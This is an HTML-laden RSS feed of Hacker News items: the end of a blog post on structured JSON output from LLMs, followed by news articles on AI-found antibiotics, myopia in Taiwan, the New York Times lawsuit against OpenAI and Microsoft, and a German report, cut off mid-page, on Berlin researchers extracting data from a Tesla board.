</span></span><span><span>      <span>"thought"</span><span>:</span> <span>"If the drying rack or space available for drying the shirts is limited, then drying 44 shirts might take longer because they would have to be dried in batches."</span><span>,</span>
</span></span><span><span>      <span>"helpful"</span><span>:</span> <span>true</span><span>,</span>
</span></span><span><span>      <span>"flawed"</span><span>:</span> <span>false</span>
</span></span><span><span>    <span>},</span>
</span></span><span><span>    <span>{</span>
</span></span><span><span>      <span>"thought"</span><span>:</span> <span>"The question does not specify the conditions under which the shirts are drying. Factors such as humidity, temperature, wind, and the availability of sunlight can affect drying time. However, these factors are not part of the question, so they should not be considered in the answer."</span><span>,</span>
</span></span><span><span>      <span>"helpful"</span><span>:</span> <span>true</span><span>,</span>
</span></span><span><span>      <span>"flawed"</span><span>:</span> <span>false</span>
</span></span><span><span>    <span>},</span>
</span></span><span><span>    <span>{</span>
</span></span><span><span>      <span>"thought"</span><span>:</span> <span>"The question might be interpreted as a direct proportionality problem, where twice the number of shirts would take twice as long to dry. However, this interpretation is flawed because it assumes that the drying time is directly proportional to the number of shirts, which is not necessarily the case."</span><span>,</span>
</span></span><span><span>      <span>"helpful"</span><span>:</span> <span>true</span><span>,</span>
</span></span><span><span>      <span>"flawed"</span><span>:</span> <span>true</span>
</span></span><span><span>    <span>},</span>
</span></span><span><span>    <span>{</span>
</span></span><span><span>      <span>"answer"</span><span>:</span> <span>"44 shirts would take the same amount of time to dry as 23 shirts, which is 1 hour, assuming that all shirts have enough space and air circulation to dry effectively."</span><span>,</span>
</span></span><span><span>      <span>"score"</span><span>:</span> <span>9</span>
</span></span><span><span>    <span>}</span>
</span></span><span><span>  <span>]</span>
</span></span><span><span><span>}</span>
</span></span></code></pre></div><p>Not bad! The final answer was concise yet even included relevant caveats, and the model was able switch between the three schema correctly.</p><p>How about another brainteaser? There is an infamous “<a href="https://www.reddit.com/r/LocalLLaMA/comments/18kpolm/that_sister_logic_puzzle_is_fairly_useless/">sister logic puzzle</a>” used to test out up-and-coming open-source large language models:</p><div><pre tabindex="0"><code data-lang="py"><span><span><span>response_structured</span> <span>=</span> <span>ai</span><span>(</span>
</span></span><span><span>    <span>"Kayley has three brothers. Each of her brothers has two sisters. How many sisters does Kayley have?"</span><span>,</span>
</span></span><span><span>    <span>output_schema</span><span>=</span><span>reason_question</span><span>,</span>
</span></span><span><span>    <span>system</span><span>=</span><span>system_prompt</span><span>.</span><span>strip</span><span>(),</span>
</span></span><span><span><span>)</span>
</span></span></code></pre></div><div><pre tabindex="0"><code data-lang="json"><span><span><span>{</span>
</span></span><span><span>  <span>"reasonings"</span><span>:</span> <span>[</span>
</span></span><span><span>    <span>{</span>
</span></span><span><span>      <span>"background"</span><span>:</span> <span>"This is a classic example of a logic puzzle that is often used to test one's ability to process information and avoid being misled by assumptions. The puzzle involves a family structure and requires the solver to deduce the number of siblings based on the given information."</span>
</span></span><span><span>    <span>},</span>
</span></span><span><span>    <span>{</span>
</span></span><span><span>      <span>"thought"</span><span>:</span> <span>"The question might be trying to trick the reader into thinking that each brother has different sisters."</span><span>,</span>
</span></span><span><span>      <span>"helpful"</span><span>:</span> <span>true</span><span>,</span>
</span></span><span><span>      <span>"flawed"</span><span>:</span> <span>false</span>
</span></span><span><span>    <span>},</span>
</span></span><span><span>    <span>{</span>
</span></span><span><span>      <span>"thought"</span><span>:</span> <span>"If Kayley has three brothers and each brother has two sisters, it might seem like there are six sisters in total."</span><span>,</span>
</span></span><span><span>      <span>"helpful"</span><span>:</span> <span>false</span><span>,</span>
</span></span><span><span>      <span>"flawed"</span><span>:</span> <span>true</span>
</span></span><span><span>    <span>},</span>
</span></span><span><span>    <span>{</span>
</span></span><span><span>      <span>"thought"</span><span>:</span> <span>"Since the brothers are Kayley's siblings, they must share the same sisters."</span><span>,</span>
</span></span><span><span>      <span>"helpful"</span><span>:</span> <span>true</span><span>,</span>
</span></span><span><span>      <span>"flawed"</span><span>:</span> <span>false</span>
</span></span><span><span>    <span>},</span>
</span></span><span><span>    <span>{</span>
</span></span><span><span>      <span>"thought"</span><span>:</span> <span>"The puzzle is designed to test comprehension and logical reasoning, not mathematical computation."</span><span>,</span>
</span></span><span><span>      <span>"helpful"</span><span>:</span> <span>true</span><span>,</span>
</span></span><span><span>      <span>"flawed"</span><span>:</span> <span>false</span>
</span></span><span><span>    <span>},</span>
</span></span><span><span>    <span>{</span>
</span></span><span><span>      <span>"answer"</span><span>:</span> <span>"Kayley has one sister."</span><span>,</span>
</span></span><span><span>      <span>"score"</span><span>:</span> <span>10</span>
</span></span><span><span>    <span>}</span>
</span></span><span><span>  <span>]</span>
</span></span><span><span><span>}</span>
</span></span></code></pre></div><p>In this case the AI may have gone <em>too</em> meta, but it still arrived at the correct answer.</p><p>That said, GPT-4 is known for handling these types of difficult abstract questions without much effort, but it’s still interesting to see how successfully it can “think.”</p><h2 id="structured-data-with-open-source-llms">Structured Data With Open-Source LLMs</h2><p>Speaking of open-source large language models, they have been growing in efficiency to the point that some can actually perform <em>better</em> than the base ChatGPT. However, very few open-source LLMs explicitly claim they intentionally support structured data, but they’re smart enough and they have logically seen enough examples of JSON Schema that with enough system prompt tweaking they should behave. It’s worth looking just in case OpenAI has another <a href="https://nymag.com/intelligencer/2023/11/why-was-sam-altman-fired-as-ceo-of-openai.html">existential crisis</a> or if the quality of ChatGPT <a href="https://twitter.com/deliprao/status/1736978250717450481">degrades</a>.</p><p><a href="https://huggingface.co/mistralai/Mistral-7B-v0.1">Mistral 7B</a>, the new darling of open-source LLMs, apparently has structured data support <a href="https://twitter.com/robertnishihara/status/1734629320868687991">on par with ChatGPT itself</a>. Therefore, I tried the latest <a href="https://huggingface.co/mistralai/Mistral-7B-Instruct-v0.2">Mistral 7B official Instruct model</a> with a quantized variant via <a href="https://lmstudio.ai/">LM Studio</a> (<code>mistral-7b-instruct-v0.2.Q6_K.gguf</code>), to see if it can handle my <code>answer_question</code> function that ChatGPT nailed. The system prompt:</p><div><pre tabindex="0"><code data-lang="plaintext"><span><span>Your response must follow this JSON Schema:
</span></span><span><span>
</span></span><span><span>{
</span></span><span><span>  "description": "Returns an answer to a question the user asked.",
</span></span><span><span>  "properties": {
</span></span><span><span>    "answer": {
</span></span><span><span>      "description": "Answer to the user's question.",
</span></span><span><span>      "type": "integer"
</span></span><span><span>    },
</span></span><span><span>    "ones_name": {
</span></span><span><span>      "description": "Name of the ones digit of the answer.",
</span></span><span><span>      "type": "string"
</span></span><span><span>    }
</span></span><span><span>  },
</span></span><span><span>  "required": ["answer", "ones_name"],
</span></span><span><span>  "type": "object"
</span></span><span><span>}
</span></span></code></pre></div><p>And then asking <code>How many miles is it from San Francisco to Los Angeles?</code> while seting <code>temperature</code> to <code>0.0</code>:</p><div><pre tabindex="0"><code data-lang="json"><span><span><span>{</span>
</span></span><span><span>  <span>"answer"</span><span>:</span> <span>383</span><span>,</span>
</span></span><span><span>  <span>"ones_name"</span><span>:</span> <span>"three"</span>
</span></span><span><span><span>}</span>
</span></span></code></pre></div><p>Close enough! Unfortunately after testing the optimized Python palindrome schema, it ignored the schema completely, so this approach may only work for simple schema if the model isn’t explicitly finetuned for it.</p><h2 id="whats-next-for-structured-data-in-ai">What’s Next For Structured Data in AI?</h2><p>Most of these well-performing examples were done with the “weak” GPT-3.5; you of course can use GPT-4 for better results, but the cost efficiency of structured data with just the smaller model is hard to argue against (although the Python beach volleyball dialogue could benefit from a larger model).</p><p>Structured data and system prompt engineering saves a lot and time and frustration for working with the generated text as you can gain much more determinism in the output. I would like to see more work making models JSON-native in future LLMs to make them easier for developers to work with, and also more research in finetuning existing open-source LLMs to understand JSON Schema better. There may also be an opportunity to build LLMs using other more-efficient serialization formats such as <a href="https://msgpack.org/index.html">MessagePack</a>.</p><p>At OpenAI’s November <a href="https://devday.openai.com/">DevDay</a>, they also introduced <a href="https://platform.openai.com/docs/guides/text-generation/json-mode">JSON Mode</a>, which will force a normal ChatGPT API output to be in a JSON format without needing to provide a schema. It is likely intended to be a compromise between complexity and usability that would have normally been a useful option in the LLM toolbox. Except that in order to use it, you are <em>required</em> to use prompt engineering by including “JSON” in the system prompt, and if you don’t also specify a field key in the system prompt (the case in the documentation example), the JSON will contain a <em>random</em> key. Which, at that point, you’re just implementing a less-effective structured data schema, so why bother?</p><p>There is promise in constraining output to be valid JSON. One new trick that the open-source <a href="https://github.com/ggerganov/llama.cpp">llama.cpp</a> project has popularized is <a href="https://github.com/ggerganov/llama.cpp/tree/master/grammars">generative grammars</a>, which constrain the LLM generation ability to only output according to specified rules. There’s latency overhead with that technique especially if the model is hosted on a discrete GPU, so it will be interesting to watch how that space develops.</p><p>Despite the length of this blog post, there’s still so much more than can be done with schemas: pydantic’s documentation is very extensive! I’ve been working with structured data for LLMs <a href="https://github.com/minimaxir/gpt-2-keyword-generation">ever since GPT-2</a> with mixed success since the base models weren’t good enough, but with LLMs now being good enough to maintain a JSON schema extremely well, I think AI text generation techniques will shift, and I’ll keep <a href="https://github.com/minimaxir/simpleaichat">simpleaichat</a> up-to-date for it.</p><blockquote><p>You can view the Jupyter Notebooks used to generate all the structured data outputs in <a href="https://github.com/minimaxir/chatgpt-structured-data">this GitHub Repository</a>.</p><p>Thanks to <a href="https://simonwillison.net/">Simon Willison</a> for reading and giving feedback on a draft of this post!</p></blockquote></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Scientists discover the first new antibiotics in over 60 years using AI (166 pts)]]></title>
            <link>https://www.euronews.com/next/2023/12/20/scientists-discover-the-first-new-antibiotics-in-over-60-years-using-ai</link>
            <guid>38782636</guid>
            <pubDate>Wed, 27 Dec 2023 15:05:54 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.euronews.com/next/2023/12/20/scientists-discover-the-first-new-antibiotics-in-over-60-years-using-ai">https://www.euronews.com/next/2023/12/20/scientists-discover-the-first-new-antibiotics-in-over-60-years-using-ai</a>, See on <a href="https://news.ycombinator.com/item?id=38782636">Hacker News</a></p>
<div id="readability-page-1" class="page"><p>
        A new class of antibiotics for drug-resistant Staphylococcus aureus (MRSA) bacteria which was discovered using more transparent deep learning models.
    </p><div><p>The use of artificial intelligence (AI) is proving to be a game-changer when it comes to medicine with the technology now helping scientists to unlock the first new antibiotics in 60 years.</p><p>The discovery of a new compound that can kill a drug-resistant bacterium that kills thousands worldwide every year could prove to be a turning point in the fight against antibiotic resistance.</p><p>"The insight here was that we could see what was being learned by the models to make their predictions that certain molecules would make for good antibiotics," James Collins, professor of Medical Engineering and Science at the Massachusetts Institute of Technology (MIT) and one of the study’s authors, <a href="https://www.eurekalert.org/news-releases/1029354"><strong>said in a statement.</strong></a></p><p>"Our work provides a framework that is time-efficient, resource-efficient, and mechanistically insightful, from a chemical-structure standpoint, in ways that we haven’t had to date".</p><p>The results were published today in <a href="https://www.nature.com/articles/s41586-023-06887-8"><strong>Nature</strong></a> and co-authored by a team of 21 researchers.</p><h2><strong>Study aimed to 'open the black box'</strong></h2><p>The team behind the project used a deep-learning model to predict the activity and toxicity of the new compound.</p><p>Deep learning involves the use of artificial neural networks to automatically learn and represent features from data without explicit programming.</p><p>It is increasingly being applied in drug discovery to accelerate the identification of potential drug candidates, predict their properties, and optimise the drug development process.</p><p>In this case, researchers focused on methicillin-resistant Staphylococcus aureus (MRSA).</p><p>Infections with MRSA can range from mild skin infections to more severe and potentially life-threatening conditions such as pneumonia and bloodstream infections.</p><p><a href="https://www.liebertpub.com/doi/full/10.1089/mdr.2020.0259"><strong>Almost 150,000 MRSA infections occur every year in the European Union</strong></a> while almost 35,000 people die annually in the bloc from antimicrobial-resistant infections, according to the European Centre for Disease Prevention and Control (ECDC).</p><p>The MIT team of researchers trained an extensively enlarged deep learning model using expanded datasets.</p><p>To create the training data, approximately 39,000 compounds were evaluated for their antibiotic activity against MRSA. Subsequently, both the resulting data and details regarding the chemical structures of the compounds were input into the model.</p><p>"What we set out to do in this study was to open the black box. These models consist of very large numbers of calculations that mimic neural connections, and no one really knows what's going on underneath the hood," said Felix Wong, a postdoc at MIT and Harvard and one of the study’s lead authors.</p><h2>Discovering a new compound</h2><p>To refine the selection of potential drugs, the researchers employed three additional deep-learning models. These models were trained to assess the toxicity of compounds on three distinct types of human cells.</p><p>By integrating these toxicity predictions with the previously determined antimicrobial activity, the researchers pinpointed compounds capable of effectively combating microbes with minimal harm to the human body.</p><p>Using this set of models, approximately 12 million commercially available compounds were screened.</p><p>The models identified compounds from five different classes, categorised based on specific chemical substructures within the molecules, that exhibited predicted activity against MRSA.</p><p>Subsequently, the researchers acquired around 280 of these compounds and conducted tests against MRSA in a laboratory setting. This approach led them to identify two promising antibiotic candidates from the same class.</p><p>In experiments involving two mouse models - one for MRSA skin infection and another for MRSA systemic infection - each of these compounds reduced the MRSA population by a factor of 10.</p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[High myopia is now the leading cause of blindness in Japan, China, and Taiwan (167 pts)]]></title>
            <link>https://www.wired.com/story/taiwan-epicenter-of-world-myopia-epidemic/</link>
            <guid>38782482</guid>
            <pubDate>Wed, 27 Dec 2023 14:52:37 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.wired.com/story/taiwan-epicenter-of-world-myopia-epidemic/">https://www.wired.com/story/taiwan-epicenter-of-world-myopia-epidemic/</a>, See on <a href="https://news.ycombinator.com/item?id=38782482">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-journey-hook="client-content" data-testid="BodyWrapper"><p><span>Doing surgery on</span> the back of the eye is a little like laying new carpet: You must begin by moving the furniture. Separate the muscles that hold the eyeball inside its socket; make a delicate cut in the conjunctiva, the mucous membrane that covers the eye. Only then can the surgeon spin the eyeball around to access the retina, the thin layer of tissue that translates light into color, shape, movement. “Sometimes you have to pull it out a little bit,” says Pei-Chang Wu, with a wry smile. He has performed hundreds of operations during his long surgical career at Chang Gung Memorial Hospital in Kaohsiung, an industrial city in southern Taiwan.</p><p>Wu is 53, tall and thin with lank dark hair and a slightly stooped gait. Over dinner at Kaohsiung’s opulent Grand Hotel, he flicks through files on his laptop, showing me pictures of eye surgery—the plastic rods that fix the eye in place, the xenon lights that illuminate the inside of the eyeball like a stage—and movie clips with vision-related subtitles that turn <em>Avengers: Endgame, Top Gun: Maverick</em>, and <em>Zootopia</em> into public health messages. He peers at the screen through Coke bottle lenses that bulge from thin silver frames.</p><div data-testid="GenericCallout"><figure><p><span>This article appears in the November 2023 issue. <a href="https://subscribe.wired.com/subscribe/splits/wired/WIR_Edit_Hardcoded?source=HCL_WIR_COVER_INSET_0">Subscribe to WIRED</a></span><span>Photograph: Sinna Nasseri</span></p></figure></div><p>Wu specializes in repairing retinal detachments, which happen when the retina separates from the blood vessels inside the eyeball that supply it with oxygen and nutrients. For the patient, this condition first manifests as pops of light or dark spots, known as floaters, which dance across their vision like fireflies. If left untreated, small tears in the retina can progress from blurred or distorted vision to full blindness—a curtain drawn across the world.</p><p>When Wu began his surgical career in the late 1990s, most of his patients were in their sixties or seventies. But in the mid-2000s, he started to notice a troubling change. The people on his operating table kept getting younger. In 2016, Wu performed a scleral buckle surgery—fastening a belt around the eye to fix the retina into place—on a 14-year-old girl, a student at an elite high school in Kaohsiung. Another patient, a prominent programmer who had worked for Yahoo, suffered two severe retinal detachments and was blind in both eyes by age 29. Both of these cases are part of a wider problem that’s been growing across Asia for decades and is rapidly becoming an issue in the West too: an explosion of myopia.</p><p>Myopia, or what we commonly call nearsightedness, happens when the eyeball gets too long—it deforms from soccer ball to American football—and then the eye focuses light not on the retina but slightly in front of it, making distant objects appear blurry. The longer the eyeball becomes, the worse vision gets. Ophthalmologists measure this distortion in diopters, which refer to the strength of the lens required to bring someone’s vision back to normal. Anything worse than minus 5 diopters is considered “high myopia”—somewhere between 20 and 25 percent of myopia diagnoses around the world are in this category. In China, up to 90 percent of teenagers and young adults are myopic. In the 1950s the figure was as low as 10 percent. A 2012 study in Seoul found that an astonishing 96.5 percent of 19-year-old men were nearsighted. Among high schoolers in Taiwan, it’s around 90 percent. In the US and Europe, myopia rates across all ages are well below 50 percent, but they’ve risen sharply in recent decades. It’s estimated that by 2050, half the world’s population will need glasses, contacts, or surgery to see across a room. High myopia is now the leading cause of blindness in Japan, China, and Taiwan.</p><p>If those trends continue, it’s likely that millions more people around the world will go blind much earlier in life than they—or the societies they live in—are prepared for. It’s a “ticking time bomb,” says Nicola Logan, an optometry professor at the UK’s Aston University. She wasn’t the only expert I talked to who used that phrase. Because so much of Taiwan’s population is already living life with myopia, the island nation has already glimpsed what could be coming for the rest of us. And in a rare confluence, the country may also be the best place to look for solutions.</p><div data-testid="GenericCallout"><figure><p><span>ILLUSTRATION: VANILLA CHI</span></p></figure></div><p><span>On the bullet</span> train south from Taipei, you can see the smog hanging over Kaohsiung from miles away, blurring the edges of the buildings. During the Japanese occupation, which ended in 1945, what had been a small trading port transformed into one of Taiwan’s biggest cities, a riot of heavy industry and shipbuilding. Over the next four decades, as Taiwan made the rapid transition from a predominantly agricultural economy to a manufacturing powerhouse, the lives of its citizens shifted too. Families flocked into cramped apartment blocks that still make up much of the urban housing. Education for children was mandatory and became increasingly intense. A network of after-school establishments called “cram schools” sprang up, making room for parents to work long hours without the childcare support from elderly relatives they would’ve had in the old society. At the end of the school day, some kids would board a bus, not to go home, but to ride to their cram school, some of which were open until 9 pm.</p><p>Pei-Chang Wu was born in Kaohsiung, at the height of the city’s transformation, in 1970. His grandparents, neither of whom were myopic, were farmers in central Taiwan. Both of his parents were teachers, and like many Asian parents, they put a huge emphasis on education as one of the few levers they could pull to move up through society. His father enforced a strict daily routine: up at 5 am for calligraphy and violin practice, school from 7:30 am to 4 pm. Once Wu got home in the evenings he had to complete his schoolwork. On the weekends, he participated in calligraphy competitions. By the age of 9, Wu had been diagnosed with myopia.</p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[The New York Times is suing OpenAI and Microsoft for copyright infringement (539 pts)]]></title>
            <link>https://www.theverge.com/2023/12/27/24016212/new-york-times-openai-microsoft-lawsuit-copyright-infringement</link>
            <guid>38781941</guid>
            <pubDate>Wed, 27 Dec 2023 13:58:21 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.theverge.com/2023/12/27/24016212/new-york-times-openai-microsoft-lawsuit-copyright-infringement">https://www.theverge.com/2023/12/27/24016212/new-york-times-openai-microsoft-lawsuit-copyright-infringement</a>, See on <a href="https://news.ycombinator.com/item?id=38781941">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><p><em>The New York Times</em> <a href="https://www.nytimes.com/2023/12/27/business/media/new-york-times-open-ai-microsoft-lawsuit.html">is suing</a> OpenAI and Microsoft for copyright infringement, claiming the two companies built their AI models by “copying and using millions” of the publication’s articles and now “directly compete” with its content as a result.</p><p>As outlined in <a href="https://nytco-assets.nytimes.com/2023/12/NYT_Complaint_Dec2023.pdf">the lawsuit</a>, the <em>Times</em> alleges OpenAI and Microsoft’s large language models (LLMs), which power ChatGPT and Copilot, “can generate output that recites Times content verbatim, closely summarizes it, and mimics its expressive style.” This “undermine[s] and damage[s]” the <em>Times</em>’ relationship with readers, the outlet alleges, while also depriving it of “subscription, licensing, advertising, and affiliate revenue.”</p><p>The complaint also argues that these AI models “threaten high-quality journalism” by hurting the ability of news outlets to protect and monetize content. “Through Microsoft’s Bing Chat (recently rebranded as “Copilot”) and OpenAI’s ChatGPT, Defendants seek to free-ride on The Times’s massive investment in its journalism by using it to build substitutive products without permission or payment,” the lawsuit states. </p><p>Meanwhile, the release of AI models trained on the <em>Times</em>’ content has proven “extremely lucrative” for both Microsoft and OpenAI, the lawsuit states. The publication claims it has attempted to negotiate with both companies for months to “ensure it received fair value for the use of its content,” but failed to reach a solution. Neither OpenAI nor Microsoft immediately responded to <em>The Verge</em>’s request for comment.</p><p>The publication is suing both companies for copyright infringement and asks them to be held liable for “billions of dollars in statutory and actual damages” for allegedly copying its works. It’s also asking the court to prevent OpenAI and Microsoft from training their AI models using its content, as well as remove the <em>Times</em>’ work from the companies’ datasets.</p><p><em>The New York Times</em> is one of many news outlets that <a href="https://www.theverge.com/2023/8/21/23840705/new-york-times-openai-web-crawler-ai-gpt">have blocked</a> OpenAI’s web crawler in recent months, preventing the AI company from continuing to scrape content from its website and using the data to train AI models. The <a href="https://www.theverge.com/2023/10/6/23906645/bbc-generative-ai-news-openai">BBC, CNN, and <em>Reuters</em></a> have moved to block OpenAI’s web crawler as well. Other publications, however, are embracing AI —&nbsp;or, at least, the payments that come with it. <a href="https://www.theverge.com/2023/12/13/23999861/openai-axel-springer-chatgpt-ai-content-insider-politico">Axel Springer, which owns <em>Politico</em> and <em>Business Insider</em></a>, struck a deal with OpenAI earlier this month that allows ChatGPT to pull information directly from both sources, while the <a href="https://www.theverge.com/2023/7/13/23793810/openai-associated-press-ai-models"><em>Associated Press</em> is allowing OpenAI</a> to train its models on its news stories for the next two years.</p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[TU Berlin Scientists Hack Tesla Autopilot and Discover Secret Elon-Mode (103 pts)]]></title>
            <link>https://t3n.de/news/tesla-autopilot-hack-geheimer-elon-modus-1598800/</link>
            <guid>38781535</guid>
            <pubDate>Wed, 27 Dec 2023 13:03:16 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://t3n.de/news/tesla-autopilot-hack-geheimer-elon-modus-1598800/">https://t3n.de/news/tesla-autopilot-hack-geheimer-elon-modus-1598800/</a>, See on <a href="https://news.ycombinator.com/item?id=38781535">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
        
        <article data-article-identifier="news-article-1598800">
                            
            
            

<nav>
    <ul>
        <li>
            <a href="https://t3n.de/" title="t3n – digital pioneers | Home">Home</a>
                            <svg width="8px" height="18" viewBox="0 0 12 14">
                    <use xlink:href="#s-angle-down" transform="translate(3, 6) rotate(-90) translate(-6, -6)"></use>
                </svg>
                    </li>
        
                    <li>
                <a href="https://t3n.de/news/" title="t3n – digital pioneers | News">News</a>
                                <svg width="8px" height="18" viewBox="0 0 12 14">
                    <use xlink:href="#s-angle-down" transform="translate(3, 6) rotate(-90) translate(-6, -6)"></use>
                </svg>
            
            </li>
        
        
                    <li>
                <a href="https://t3n.de/tag/mobilitaet/" title="t3n – digital pioneers | Mobilität">Mobilität</a>
                                <svg width="8px" height="18" viewBox="0 0 12 14">
                    <use xlink:href="#s-angle-down" transform="translate(3, 6) rotate(-90) translate(-6, -6)"></use>
                </svg>
            
            </li>
        
        
        <li>
            
        </li>
    </ul>
</nav>
            <div id="article">
                

                

                <p>
                                                                
Drei Doktoranden aus Berlin ist es gelungen, eine Tesla-Platine zu hacken und neben Firmengeheimnissen und privaten Daten den Elon-Modus offenzulegen. Was macht der?

                                    </p>

                                                    
                
                                    
                
                            </div>

                                        
    
            
            
            <div id="main-content">
                                                    <figure>
                                <div>
                                                                                <p><img src="https://images.t3n.de/news/wp-content/uploads/2023/05/tesla-gebaeude.jpg?class=hero" width="620" height="350" alt="Berliner IT-Experten hacken Teslas Autopilot und finden geheimen Elon-Modus" title="Laut eines Spiegel-Berichts konnten drei Doktoranden einer Tesla-Platine mit wenig Aufwand viele Geheimnisse entlocken. (Foto: Shutterstock / Nadezda Murmakova)">
    </p>

                                                                                                        </div>
                                <div>
                                    <figcaption>
                                        <p>Laut eines Spiegel-Berichts konnten drei Doktoranden einer Tesla-Platine mit wenig Aufwand viele Geheimnisse entlocken. (Foto: Shutterstock / Nadezda Murmakova)</p>
                                    </figcaption>
                                </div>
                            </figure>
                        
                                                    
                        
                        <div>
                                                                                        
                                                                                                <p>
Statt mit Codezeilen Sicherheitssysteme zu umgehen, haben die drei Doktoranden Niclas Kühnapfel, Christian Werling und Hans-Niklas Jacob aus Berlin die Platine eines Teslas mit Werkzeug im Wert von 600 Euro überlistet. Das berichtet der <a href="https://www.spiegel.de/netzwelt/gadgets/tesla-berliner-hacker-knacken-den-autopilot-a-792d7095-e7ce-4ead-96af-11feec00761a">Spiegel</a>. Demnach hätten sie dafür eine Schwachstelle in der Platine ausgenutzt, die sie über Kontakte aus den USA erhalten haben.
 </p><p id="Geschaeftsgeheimnisse_und_ElonModus">
							<h2><span>
									<a href="#Geschaeftsgeheimnisse_und_ElonModus">
										<svg width="14px" height="18px" viewBox="0 -1 16 16" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
											<g id="Page-1" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
												<g id="link" fill="#000000" fill-rule="nonzero">
													<path d="M14.7225919,7.40526466 L12.4639861,9.66387039 C12.5380387,8.81226499 12.4269598,7.97917266 12.1307492,7.18310673 L13.3155915,5.97975122 C14.2227365,5.0726063 14.2227365,3.59155336 13.3155915,2.68440844 C12.4084466,1.77726352 10.9273937,1.77726352 10.0202488,2.68440844 L7.52097193,5.16517211 C6.61382699,6.09083019 6.61382699,7.55336999 7.52097193,8.47902806 C7.92826146,8.86780446 7.92826146,9.49725192 7.52097193,9.88602832 C7.13219553,10.2748047 6.50274806,10.2748047 6.11397166,9.88602832 C4.42927394,8.18281746 4.42927394,5.44286953 6.11397166,3.75817182 L8.59473532,1.27740816 C10.2979462,-0.425802719 13.0378941,-0.425802719 14.7225919,1.27740816 C16.4258027,2.96210587 16.4258027,5.7020538 14.7225919,7.40526466 Z M9.89065666,12.2371999 L7.39137979,14.7364767 C5.70668209,16.4211744 2.96673416,16.4211744 1.26352329,14.7364767 C-0.421174428,13.0332659 -0.421174428,10.2933179 1.26352329,8.60862019 L3.54064217,6.33150133 C3.46658952,7.18310673 3.5776685,8.03471219 3.87387908,8.83077812 L2.68903674,10.0156205 C1.78189181,10.9227654 1.78189181,12.4038183 2.68903674,13.3109633 C3.59618166,14.2181082 5.07723459,14.2181082 5.98437951,13.3109633 L8.46514319,10.8301996 C9.39080126,9.92305466 9.39080126,8.44200172 8.46514319,7.53485679 C8.07636679,7.14608039 8.07636679,6.49811973 8.46514319,6.10934333 C8.85391959,5.72056696 9.50188026,5.72056696 9.89065666,6.10934333 C11.5753543,7.81255426 11.5753543,10.5525022 9.89065666,12.2371999 Z" id="Icon_URL"></path>
												</g>
											</g>
										</svg>
									</a>Geschäftsgeheimnisse und Elon-Modus</span></h2>	
						</p>
<p>Nach eigenen Angaben förderten sie dabei Geschäftsgeheimnisse von Tesla zutage. So ließ sich laut Bericht nachvollziehen, welche Autopilot-Daten aus dem laufenden Betrieb das Unternehmen zurückschickt, um die eigene künstliche Intelligenz zu trainieren.</p>
<div>
        <p>Empfehlungen der Redaktion</p>
        <p><span id="shuffle-crosslinks-button">
                <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" viewBox="0 0 512 512" width="16px" height="16px" xml:space="preserve">
                    <g>
                        <path d="M168.7,328.5L112.6,384c-14.8,14.9-40.7,25.6-61.4,25.6H0v-51.2h51.2c7.4,0,20.5-5.1,25.6-10.5l55.6-55.8L168.7,328.5z    M409.6,102.4V25.6L512,128L409.6,230.4v-76.8h-51.2c-7.4,0-20.5,5.1-25.6,10.5l-55.5,55.8l-36.6-36.3L297,128   c14.9-14.8,40.7-25.6,61.7-25.6h51.2H409.6z M409.6,358.4v-76.8L512,384L409.6,486.4v-76.8h-51.2c-21,0-46.9-10.8-61.7-25.6   L76.6,164.1c-4.9-5.1-17.7-10.5-25.4-10.5H0v-51.2h51.2c21,0,46.9,10.8,61.7,25.6L333,347.9c5.1,5.1,17.9,10.5,25.4,10.5H409.6z"></path>
                    </g>
                </svg>
            </span>
            <span id="bookmark-tooltip">Artikel wechseln</span>
        </p>
       
    </div>

<p>Zusätzlich fanden die drei Doktoranden bei der Arbeit ein Video auf der Platine, das zwar gelöscht, aber noch nicht überspielt worden sei. Es zeigt einen Tesla unterwegs in den USA. Zeitpunkt und GPS-Position ließen sich ebenfalls nachbilden.</p>
<p>Ein weiterer spektakulärer Fund: Die drei Männer konnten bestätigen, dass Teslas einen sogenannten Elon-Modus enthalten. Den hatte <a href="https://t3n.de/news/elon-mode-tesla-autonom-fahren-1573366/">ein anderer Hacker bereits im Sommer aktivieren können</a>. Ist der Modus eingeschaltet, könne das Auto autonom fahren, ohne dass Fahrer:innen die Hände ständig am Lenkrad halten müssten.</p>
 <p id="Kaum_Gefahr_fuer_Privatnutzer">
							<h2><span>
									<a href="#Kaum_Gefahr_fuer_Privatnutzer">
										<svg width="14px" height="18px" viewBox="0 -1 16 16" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
											<g id="Page-1" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
												<g id="link" fill="#000000" fill-rule="nonzero">
